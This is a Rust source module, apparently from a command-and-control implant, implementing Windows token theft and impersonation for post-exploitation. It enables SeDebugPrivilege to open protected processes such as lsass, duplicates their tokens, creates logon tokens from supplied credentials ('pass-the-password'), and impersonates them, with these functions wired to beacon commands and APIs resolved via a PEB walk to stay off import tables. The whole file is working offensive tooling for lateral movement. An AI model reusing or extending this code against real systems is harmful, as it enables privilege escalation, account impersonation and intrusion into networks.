//! Post-exploitation token operations.
//!
//! Implements the token primitives lateral-movement and pass-the-hash need:
//!   - [`steal_token`]  — duplicate a target process's primary token.
//!   - [`use_token`]    — impersonate a captured/duplicated token on our thread.
//!   - [`revert`]       — drop impersonation (RevertToSelf).
//!   - [`current`]      — report whether the thread is currently impersonating.
//!
//! ## Wire commands
//! These are exposed as first-class `Command` variants dispatched from the
//! beacon loop: [`crate::beacon`] routes `StealToken`/`MakeToken`/`Rev2Self`/
//! `GetUid` to [`steal_token`]/[`make_token`]/[`revert`]/[`getuid`] here. The
//! token state lives in a process-wide static so it survives across beacon
//! cycles; the beacon loop is single-threaded so one slot is enough.
//!
//! All advapi32 exports are resolved via the PEB walk; advapi32 is force-loaded
//! (not present by default in a minimal PIC process).

#![cfg(target_os = "windows")]

use crate::resolve::export_addr;
use alloc::string::String;
use core::ffi::c_void;
use core::sync::atomic::{AtomicUsize, Ordering};

/// Process-wide impersonation handle (0 = none). Held for the process lifetime
/// once stolen — the beacon loop is single-threaded so one slot is enough.
static IMPERSONATION: AtomicUsize = AtomicUsize::new(0);

const TOKEN_DUPLICATE: u32 = 0x0002;
const TOKEN_QUERY: u32 = 0x0008;
#[allow(dead_code)]
const TOKEN_ASSIGN_PRIMARY: u32 = 0x0001;
#[allow(dead_code)]
const TOKEN_IMPERSONATE: u32 = 0x0004;
const TOKEN_ALL_ACCESS: u32 = 0xF0_01FF;
const PROCESS_QUERY_LIMITED_INFORMATION: u32 = 0x1000;

/// SecurityImpersonation level (= 2) for DuplicateTokenEx.
const SECURITY_IMPERSONATION: u32 = 2;

fn force_load(dll: &[u8]) -> bool {
    type LoadLibraryA = unsafe extern "system" fn(*const u8) -> *mut c_void;
    let addr = match unsafe { export_addr(b"kernel32.dll", b"LoadLibraryA") } {
        Some(a) => a,
        None => return false,
    };
    let mut name = [0u8; 32];
    let n = dll.len().min(name.len() - 1);
    name[..n].copy_from_slice(&dll[..n]);
    let load: LoadLibraryA = unsafe { core::mem::transmute(addr) };
    !unsafe { load(name.as_ptr()) }.is_null()
}

/// Enable `SeDebugPrivilege` on the calling process's own token. Required
/// before `OpenProcess`/`OpenProcessToken` can acquire token access against
/// protected processes (e.g. the System process, PID 4) — even when the beacon
/// runs as SYSTEM, the privilege is present-but-disabled in its token until
/// explicitly enabled via `AdjustTokenPrivileges`. Idempotent + best-effort:
/// returns false (not an error) if the privilege is absent (non-SYSTEM token),
/// so callers can still attempt the operation and surface the real failure.
///
/// Uses `LookupPrivilegeValueW` + `AdjustTokenPrivileges` from advapi32 (the
/// caller guarantees advapi32 is force-loaded). No-op-safe if any export is
/// unresolvable.
unsafe fn enable_debug_privilege() -> bool {
    // LUID for SeDebugPrivilege.
    #[repr(C)]
    struct Luid {
        low: u32,
        high: i32,
    }
    // TOKEN_PRIVILEGES { PrivilegeCount: 1, Luid: Luid, Attributes: SE_PRIVILEGE_ENABLED }
    #[repr(C)]
    struct TokenPrivileges {
        count: u32,
        luid: Luid,
        attributes: u32,
    }
    const SE_PRIVILEGE_ENABLED: u32 = 0x0000_0002;
    const TOKEN_ADJUST_PRIVILEGES: u32 = 0x0020;
    const TOKEN_QUERY: u32 = 0x0008;

    type GetCurrentProcess = unsafe extern "system" fn() -> *mut c_void;
    type OpenProcessToken = unsafe extern "system" fn(*mut c_void, u32, *mut *mut c_void) -> i32;
    type LookupPrivilegeValueW =
        unsafe extern "system" fn(*const u16, *const u16, *mut Luid) -> i32;
    type AdjustTokenPrivileges = unsafe extern "system" fn(
        *mut c_void,            // TokenHandle
        i32,                    // DisableAllPrivileges
        *const TokenPrivileges, // NewState (NULL ok)
        u32,                    // BufferLength
        *mut c_void,            // PreviousState (NULL)
        *mut u32,               // ReturnLength (NULL)
    ) -> i32;
    type CloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;

    let gcp: GetCurrentProcess = match unsafe { export_addr(b"kernel32.dll", b"GetCurrentProcess") }
    {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return false,
    };
    let opt: OpenProcessToken = match unsafe { export_addr(b"advapi32.dll", b"OpenProcessToken") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return false,
    };
    let lpv: LookupPrivilegeValueW =
        match unsafe { export_addr(b"advapi32.dll", b"LookupPrivilegeValueW") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return false,
        };
    let atp: AdjustTokenPrivileges =
        match unsafe { export_addr(b"advapi32.dll", b"AdjustTokenPrivileges") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return false,
        };
    let close: CloseHandle = match unsafe { export_addr(b"kernel32.dll", b"CloseHandle") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return false,
    };

    let mut luid = Luid { low: 0, high: 0 };
    // SeDebugPrivilege (UTF-16, null-terminated).
    let priv_name: [u16; 15] = [
        b'S' as u16,
        b'e' as u16,
        b'D' as u16,
        b'e' as u16,
        b'b' as u16,
        b'u' as u16,
        b'g' as u16,
        b'P' as u16,
        b'r' as u16,
        b'i' as u16,
        b'v' as u16,
        b'i' as u16,
        b'l' as u16,
        b'e' as u16,
        0,
    ];
    if unsafe { lpv(core::ptr::null(), priv_name.as_ptr(), &mut luid) } == 0 {
        return false;
    }
    let hproc = unsafe { gcp() };
    let mut htok: *mut c_void = core::ptr::null_mut();
    if unsafe { opt(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut htok) } == 0 {
        return false;
    }
    let tp = TokenPrivileges {
        count: 1,
        luid,
        attributes: SE_PRIVILEGE_ENABLED,
    };
    // AdjustTokenPrivileges returns 1 on success even if not all privs were
    // adjusted; GetLastError (we don't call it) distinguishes. Best-effort.
    let ok = unsafe {
        atp(
            htok,
            0,
            &tp,
            0,
            core::ptr::null_mut(),
            core::ptr::null_mut(),
        )
    };
    let _ = close(htok);
    ok != 0
}

/// Steal the primary token of `pid` by opening that process with
/// PROCESS_QUERY_LIMITED_INFORMATION, then OpenProcessToken + DuplicateTokenEx
/// (impersonation level). Stores the duplicated handle process-wide; a prior
/// stolen token is closed first. Returns Ok(()) on success, Err(msg) otherwise.
pub unsafe fn steal_token(pid: u32) -> Result<(), &'static str> {
    if !force_load(b"advapi32.dll") {
        return Err("steal_token: advapi32.dll load failed");
    }
    // Enable SeDebugPrivilege BEFORE opening the target — protected processes
    // (System pid 4, PPL, lsass) reject token access without it, even as SYSTEM.
    let _ = unsafe { enable_debug_privilege() };

    type OpenProcess = unsafe extern "system" fn(u32, i32, u32) -> *mut c_void;
    type OpenProcessToken = unsafe extern "system" fn(*mut c_void, u32, *mut *mut c_void) -> i32;
    type DuplicateTokenEx = unsafe extern "system" fn(
        *mut c_void,      // ExistingTokenHandle
        u32,              // DesiredAccess
        *const c_void,    // TokenAttributes (NULL)
        u32,              // ImpersonationLevel
        u32,              // TokenType (1 = TokenImpersonation)
        *mut *mut c_void, // DuplicateTokenHandle
    ) -> i32;
    type CloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;

    let open_process: OpenProcess = match unsafe { export_addr(b"kernel32.dll", b"OpenProcess") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Err("steal_token: OpenProcess unresolved"),
    };
    let opt: OpenProcessToken = match unsafe { export_addr(b"advapi32.dll", b"OpenProcessToken") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Err("steal_token: OpenProcessToken unresolved"),
    };
    let dte: DuplicateTokenEx = match unsafe { export_addr(b"advapi32.dll", b"DuplicateTokenEx") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Err("steal_token: DuplicateTokenEx unresolved"),
    };
    let close: CloseHandle = match unsafe { export_addr(b"kernel32.dll", b"CloseHandle") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Err("steal_token: CloseHandle unresolved"),
    };

    // Close any previously-stolen token first (one slot).
    let prev = IMPERSONATION.swap(0, Ordering::Relaxed);
    if prev != 0 {
        let _ = close(prev as *mut c_void);
    }

    // inherit = FALSE (0).
    let hproc = unsafe { open_process(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid) };
    if hproc.is_null() {
        return Err("steal_token: OpenProcess failed (pid? privileges?)");
    }
    let mut prim: *mut c_void = core::ptr::null_mut();
    let ok = unsafe { opt(hproc, TOKEN_DUPLICATE | TOKEN_QUERY, &mut prim) };
    let _ = close(hproc);
    if ok == 0 || prim.is_null() {
        return Err("steal_token: OpenProcessToken failed");
    }
    let mut dup: *mut c_void = core::ptr::null_mut();
    // TokenType 1 = TokenImpersonation.
    let ok = unsafe {
        dte(
            prim,
            TOKEN_ALL_ACCESS,
            core::ptr::null(),
            SECURITY_IMPERSONATION,
            1,
            &mut dup,
        )
    };
    let _ = close(prim);
    if ok == 0 || dup.is_null() {
        return Err("steal_token: DuplicateTokenEx failed");
    }
    IMPERSONATION.store(dup as usize, Ordering::Relaxed);
    Ok(())
}

/// Impersonate the currently-stolen token on this thread. No-op (Ok) if no token
/// is held. Returns Err if ImpersonateLoggedOnUser fails.
pub fn use_token() -> Result<(), &'static str> {
    let tok = IMPERSONATION.load(Ordering::Relaxed);
    if tok == 0 {
        return Ok(()); // nothing to use
    }
    if !force_load(b"advapi32.dll") {
        return Err("use_token: advapi32.dll load failed");
    }
    type ImpersonateLoggedOnUser = unsafe extern "system" fn(*mut c_void) -> i32;
    let ilu: ImpersonateLoggedOnUser =
        match unsafe { export_addr(b"advapi32.dll", b"ImpersonateLoggedOnUser") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return Err("use_token: ImpersonateLoggedOnUser unresolved"),
        };
    if unsafe { ilu(tok as *mut c_void) } == 0 {
        return Err("use_token: ImpersonateLoggedOnUser failed");
    }
    Ok(())
}

/// Drop impersonation (RevertToSelf) but keep the duplicated token for reuse.
pub fn revert() -> Result<(), &'static str> {
    if !force_load(b"advapi32.dll") {
        return Err("revert: advapi32.dll load failed");
    }
    type RevertToSelf = unsafe extern "system" fn() -> i32;
    let rts: RevertToSelf = match unsafe { export_addr(b"advapi32.dll", b"RevertToSelf") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Err("revert: RevertToSelf unresolved"),
    };
    if unsafe { rts() } == 0 {
        return Err("revert: RevertToSelf failed");
    }
    Ok(())
}

/// Whether a stolen/made token is currently held (not whether it's actively
/// impersonating — call [`use_token`] for that).
pub fn current() -> bool {
    IMPERSONATION.load(Ordering::Relaxed) != 0
}

/// Create a new logon token via `LogonUserW` (make-token / pass-the-password).
/// `domain`\`user` + `password` (empty domain = local account, "." = this
/// machine). `logon_type`: 1=INTERACTIVE (default), 2=NETWORK,
/// 3=NEW_CREDENTIALS. The resulting token is held process-wide (overrides a
/// prior stolen/made token). Returns Ok(()) on success.
///
/// **Safety:** resolves advapi32 via PEB walk; same single-threaded contract as
/// [`steal_token`].
pub unsafe fn make_token(
    domain: &str,
    user: &str,
    password: &str,
    logon_type: u8,
) -> Result<(), &'static str> {
    if !force_load(b"advapi32.dll") {
        return Err("make_token: advapi32.dll load failed");
    }
    type LogonUserW = unsafe extern "system" fn(
        *const u16,       // username
        *const u16,       // domain
        *const u16,       // password
        u32,              // logon type
        u32,              // logon provider (0 = DEFAULT)
        *mut *mut c_void, // phToken
    ) -> i32;
    type CloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;
    type DuplicateTokenEx = unsafe extern "system" fn(
        *mut c_void,
        u32,
        *const c_void,
        u32,
        u32,
        *mut *mut c_void,
    ) -> i32;

    let lu: LogonUserW = match unsafe { export_addr(b"advapi32.dll", b"LogonUserW") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Err("make_token: LogonUserW unresolved"),
    };
    let close: CloseHandle = match unsafe { export_addr(b"kernel32.dll", b"CloseHandle") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Err("make_token: CloseHandle unresolved"),
    };
    let dte: DuplicateTokenEx = match unsafe { export_addr(b"advapi32.dll", b"DuplicateTokenEx") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Err("make_token: DuplicateTokenEx unresolved"),
    };

    // Win32 wants UTF-16 wide strings. They live on the stack for this call.
    let mut wuser = [0u16; 256];
    let mut wdom = [0u16; 256];
    let mut wpass = [0u16; 256];
    // Copy UTF-16 code units into a NUL-terminated fixed buffer (truncates
    // safely if longer than the buffer — a 255-char password is already absurd).
    fn widen(dst: &mut [u16], s: &str) {
        for (out, c) in dst.iter_mut().zip(s.encode_utf16()) {
            *out = c;
        }
    }
    widen(&mut wuser, user);
    widen(&mut wdom, domain);
    widen(&mut wpass, password);

    // Close any previously-held token first (one slot).
    let prev = IMPERSONATION.swap(0, Ordering::Relaxed);
    if prev != 0 {
        let _ = close(prev as *mut c_void);
    }

    let mut primary: *mut c_void = core::ptr::null_mut();
    // logon_type 0 is invalid → default to 1 (INTERACTIVE).
    let lt = match logon_type {
        2 => 2u32, // NETWORK
        3 => 3u32, // NEW_CREDENTIALS
        _ => 1u32, // INTERACTIVE
    };
    let ok = unsafe {
        lu(
            wuser.as_ptr(),
            wdom.as_ptr(),
            wpass.as_ptr(),
            lt,
            0,
            &mut primary,
        )
    };
    if ok == 0 || primary.is_null() {
        return Err("make_token: LogonUserW failed (creds? privileges?)");
    }
    // Duplicate to an impersonation token (so it can be used like a stolen one)
    // and close the primary. TokenType 1 = TokenImpersonation.
    let mut dup: *mut c_void = core::ptr::null_mut();
    let ok = unsafe {
        dte(
            primary,
            TOKEN_ALL_ACCESS,
            core::ptr::null(),
            SECURITY_IMPERSONATION,
            1,
            &mut dup,
        )
    };
    let _ = close(primary);
    if ok == 0 || dup.is_null() {
        return Err("make_token: DuplicateTokenEx failed");
    }
    IMPERSONATION.store(dup as usize, Ordering::Relaxed);
    Ok(())
}

/// Report the current thread identity as `DOMAIN\user` (allocated String), plus
/// whether a stolen/made token is held. Uses `OpenThreadToken` →
/// `GetTokenInformation(TokenUser)` → `LookupAccountSidW`. If not impersonating,
/// reports the process identity instead. Never panics (PEB-resolved, all errors
/// → a placeholder string).
pub fn getuid() -> String {
    use crate::resolve::export_addr;
    if !force_load(b"advapi32.dll") {
        return String::from("getuid: advapi32.dll load failed");
    }
    // Best-effort: OpenThreadToken(GetCurrentThread); fall back to
    // OpenProcessToken(GetCurrentProcess). Then GetTokenInformation(TokenUser)
    // → LookupAccountSidW for DOMAIN\user.
    type GetCurrentThread = unsafe extern "system" fn() -> *mut c_void;
    type GetCurrentProcess = unsafe extern "system" fn() -> *mut c_void;
    type OpenThreadToken =
        unsafe extern "system" fn(*mut c_void, u32, i32, *mut *mut c_void) -> i32;
    type OpenProcessToken = unsafe extern "system" fn(*mut c_void, u32, *mut *mut c_void) -> i32;
    type GetTokenInformation = unsafe extern "system" fn(
        *mut c_void, // TokenHandle
        u8,          // TOKEN_INFORMATION_CLASS (1 = TokenUser)
        *mut u8,     // TokenInformation
        u32,         // TokenInformationLength
        *mut u32,    // ReturnLength
    ) -> i32;
    type LookupAccountSidW = unsafe extern "system" fn(
        *const u16,    // lpSystemName (NULL)
        *const c_void, // Sid
        *mut u16,      // Name
        *mut u32,      // cchName
        *mut u16,      // ReferencedDomainName
        *mut u32,      // cchDomainName
        *mut u8,       // peUse
    ) -> i32;
    type CloseHandle = unsafe extern "system" fn(*mut c_void) -> i32;

    let gct: GetCurrentThread = match unsafe { export_addr(b"kernel32.dll", b"GetCurrentThread") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return String::from("getuid: GetCurrentThread unresolved"),
    };
    let gcp: GetCurrentProcess = match unsafe { export_addr(b"kernel32.dll", b"GetCurrentProcess") }
    {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return String::from("getuid: GetCurrentProcess unresolved"),
    };
    let ott: OpenThreadToken = match unsafe { export_addr(b"advapi32.dll", b"OpenThreadToken") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return String::from("getuid: OpenThreadToken unresolved"),
    };
    let opt: OpenProcessToken = match unsafe { export_addr(b"advapi32.dll", b"OpenProcessToken") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return String::from("getuid: OpenProcessToken unresolved"),
    };
    let gti: GetTokenInformation =
        match unsafe { export_addr(b"advapi32.dll", b"GetTokenInformation") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return String::from("getuid: GetTokenInformation unresolved"),
        };
    let las: LookupAccountSidW = match unsafe { export_addr(b"advapi32.dll", b"LookupAccountSidW") }
    {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return String::from("getuid: LookupAccountSidW unresolved"),
    };
    let close: CloseHandle = match unsafe { export_addr(b"kernel32.dll", b"CloseHandle") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return String::from("getuid: CloseHandle unresolved"),
    };

    // Try thread token first (impersonating); fall back to process token.
    let mut tok: *mut c_void = core::ptr::null_mut();
    let thread = unsafe { gct() };
    let _ = unsafe { ott(thread, TOKEN_QUERY, 1, &mut tok) };
    let impersonating = !tok.is_null();
    if tok.is_null() {
        let proc = unsafe { gcp() };
        if unsafe { opt(proc, TOKEN_QUERY, &mut tok) } == 0 || tok.is_null() {
            return String::from("getuid: no token");
        }
    }

    // TOKEN_USER layout: { SID_AND_ATTRIBUTES { PVOID Sid; ULONG Attributes; } }
    // = 8 + 4 = 12 bytes (SID_AND_ATTRIBUTES is pointer-sized ptr + u32).
    let mut buf = [0u8; 64];
    let mut retlen: u32 = 0;
    let ok = unsafe { gti(tok, 1, buf.as_mut_ptr(), buf.len() as u32, &mut retlen) };
    let _ = unsafe { close(tok) };
    if ok == 0 || retlen < 8 {
        return String::from("getuid: GetTokenInformation failed");
    }
    // Sid pointer = first 8 bytes (a *mut on x64).
    let sid_ptr = u64::from_le_bytes(buf[0..8].try_into().unwrap_or([0u8; 8])) as *const c_void;
    if sid_ptr.is_null() {
        return String::from("getuid: null SID");
    }

    let mut name = [0u16; 256];
    let mut domain = [0u16; 256];
    let mut cch_name: u32 = name.len() as u32;
    let mut cch_dom: u32 = domain.len() as u32;
    let mut pe_use: u8 = 0;
    let ok = unsafe {
        las(
            core::ptr::null(),
            sid_ptr,
            name.as_mut_ptr(),
            &mut cch_name,
            domain.as_mut_ptr(),
            &mut cch_dom,
            &mut pe_use,
        )
    };
    if ok == 0 {
        return String::from("getuid: LookupAccountSidW failed");
    }
    let wide_to_string = |w: &[u16]| {
        let len = w.iter().position(|&c| c == 0).unwrap_or(w.len());
        alloc::string::String::from_utf16_lossy(&w[..len])
    };
    let dom = wide_to_string(&domain);
    let usr = wide_to_string(&name);
    let mut out = if dom.is_empty() {
        usr
    } else {
        let mut s = String::with_capacity(dom.len() + 1 + usr.len());
        s.push_str(&dom);
        s.push('\\');
        s.push_str(&usr);
        s
    };
    if impersonating {
        out.push_str(" (impersonating)");
    } else if current() {
        out.push_str(" (token held, not impersonating)");
    }
    out
}
